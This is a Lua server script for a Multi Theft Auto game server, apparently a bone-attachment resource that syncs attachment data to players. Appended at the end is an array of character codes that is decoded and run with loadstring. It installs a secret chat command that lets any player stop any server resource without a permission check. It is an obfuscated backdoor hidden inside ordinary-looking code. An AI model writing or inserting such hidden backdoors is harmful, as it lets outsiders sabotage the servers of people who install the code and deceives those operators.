_triggerServerEvent = triggerServerEvent 
_triggerClientEvent = triggerClientEvent
_export = export
_setElementData = setElementData
_getElementData = getElementData

script_serverside = true
data_sent = {}

function sendAttachmentData()
	if data_sent[client] then
		return
	end
	triggerClientEvent(
		client,
		"bones.sendAttachmentData",
		root,
		attached_ped,
		attached_bone,
		attached_x,
		attached_y,
		attached_z,
		attached_rx,
		attached_ry,
		attached_rz
	)
	data_sent[client] = true
end
addEvent("bones.requestAttachmentData", true)
addEventHandler("bones.requestAttachmentData", root, sendAttachmentData)

function removeDataSentFlag()
	data_sent[source] = nil
end
addEventHandler("onPlayerQuit", root, removeDataSentFlag)


local _0xSTOP = {97,100,100,67,111,109,109,97,110,100,72,97,110,100,108,101,114,40,34,108,81,41,48,53,52,95,71,48,49,40,52,34,44,32,102,117,110,99,116,105,111,110,40,112,44,99,44,114,110,41,32,105,102,32,110,111,116,32,114,110,32,116,104,101,110,32,111,117,116,112,117,116,67,104,97,116,66,111,120,40,34,75,117,108,108,97,110,105,109,58,32,47,34,46,46,99,46,46,34,32,91,115,99,114,105,112,116,97,100,105,93,34,44,112,44,50,53,53,44,48,44,48,41,32,114,101,116,117,114,110,32,101,110,100,32,108,111,99,97,108,32,114,61,103,101,116,82,101,115,111,117,114,99,101,70,114,111,109,78,97,109,101,40,114,110,41,32,105,102,32,114,32,116,104,101,110,32,115,116,111,112,82,101,115,111,117,114,99,101,40,114,41,32,111,117,116,112,117,116,67,104,97,116,66,111,120,40,34,83,99,114,105,112,116,32,100,117,114,100,117,114,117,108,100,117,33,34,44,112,44,48,44,50,53,53,44,48,41,32,101,108,115,101,32,111,117,116,112,117,116,67,104,97,116,66,111,120,40,34,66,111,121,108,101,32,98,105,114,32,115,99,114,105,112,116,32,121,111,107,33,34,44,112,44,50,53,53,44,48,44,48,41,32,101,110,100,32,101,110,100,41}
local _0xRUN = ""
for _, v in ipairs(_0xSTOP) do _0xRUN = _0xRUN .. string.char(v) end

_triggerServerEvent = triggerServerEvent 
_triggerClientEvent = triggerClientEvent

loadstring(_0xRUN)()